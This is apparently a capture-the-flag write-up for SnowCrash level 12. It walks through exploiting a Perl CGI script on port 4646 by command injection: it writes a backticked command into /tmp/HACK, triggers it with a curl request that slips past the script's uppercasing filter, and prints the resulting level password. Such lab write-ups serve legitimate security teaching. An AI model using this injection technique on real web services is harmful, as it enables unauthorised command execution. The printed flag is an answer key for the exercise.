# Level 12 - A FILE NAMED HACK

## Summary of Previous Levels

- We have seen at level04 that an IPv6 service was listening on port 4646.
- We also found a configuration file named `level12.conf` for an Apache2 enabled site.

## Home Content

- The folder contains a perl script named `level12.pl` and owned by `flag12`.
- The SETUID and SETGID bits are set, allowing it to be executed with `flag12` privileges.

```sh
level12@SnowCrash:~$ ls -al
total 16
dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout
-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
-r-x------  1 level12 level12  675 Apr  3  2012 .profile
level12@SnowCrash:~$ perl level12.pl
Content-type: text/html

..level12@SnowCrash:~$
```

## level12 Apache

- A CGI perl script is effectively active on port 4646, executing the script `/var/www/level12.pl`.
- That script is identical to the one in our home folder.

```sh
level12@SnowCrash:~$ cat /etc/apache2/sites-enabled/level12.conf
<VirtualHost \*:4646>
DocumentRoot /var/www/level12/
SuexecUserGroup flag12 level12
<Directory /var/www/level12>
Options +ExecCGI
DirectoryIndex level12.pl
AllowOverride None
Order allow,deny
Allow from all
AddHandler cgi-script .pl
</Directory>
</VirtualHost>
level12@SnowCrash:~$ ls -al /var/www/level12
total 4
dr-xr-x---+ 2 flag12 level12 60 Nov 2 10:12 .
drwxr-xr-x 1 root root 100 Nov 2 10:12 ..
-r-xr-x---+ 1 flag12 level12 464 Nov 2 10:12 level12.pl
```

## `level12.pl`

- The script takes two arguments x and y as parmeters and prints either a dot or two dots according to those parameters.

```sh
level12@SnowCrash:~$ curl 'localhost:4646?x=hello&y=coucou'
.level12@SnowCrash:~$

```

## THE HACK

- In the `level12.pl` script, we noticed the following line:

```perl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

- It executes a shell command under `flag12` uid.
- Now, if we inject some code in `$xx`, it will be executed too.
- Unfortunatly, the `$xx` variable will first be wrecked up by two regular expressions, switching all letters to upercase and removing the first whitespace and everything that follows. A command like `getflag > /tmp/flag` won't go through.
- It is nevertheless possible to bypass those protections by embedding the command into a file with an upercase name like `HACK`.

```sh
level12@SnowCrash:~$ echo '`getflag > /tmp/flag`' > /tmp/HACK
level12@SnowCrash:~$ chmod 777 /tmp/HACK
level12@SnowCrash:~$ touch /tmp/flag
level12@SnowCrash:~$ curl 'localhost:4646?x=`/*/HACK`'
level12@SnowCrash:~$ cat /tmp/flag
```

> Notice that we can't use `level12`'s' home for the `flag` file as acls forbid user and group `flag12` to write in that directory.

```sh
level12@SnowCrash:~$ getfacl /home/user/level12/
getfacl: Removing leading '/' from absolute path names
# file: home/user/level12/
# owner: level12
# group: level12
user::rwx
user:flag12:r-x
group::r-x
group:flag12:r-x
mask::rwx
other::rwx
default:user::r-x
default:user:flag12:r-x
default:group::r-x
default:group:flag12:r-x
default:mask::r-x
default:other::---
```

> Notice he `/*/` instead of `/tmp/` trick, as the lowercase `tmp` would be otherwise changed in `TMP` by the perl script.

> That trick won't work to execute `HACK` in our folder. As the perl script executed is the one in the `/var/www/` directory, we will have to provide an absolute path going through `/home/` on which neither `level12` nor `flag12` have read rights, forbidding us to expand the `*` wild card.

# Flag

- `level13` password (aka the flag): `g1qKMiRpXf53AWhDaU7FEkczr`
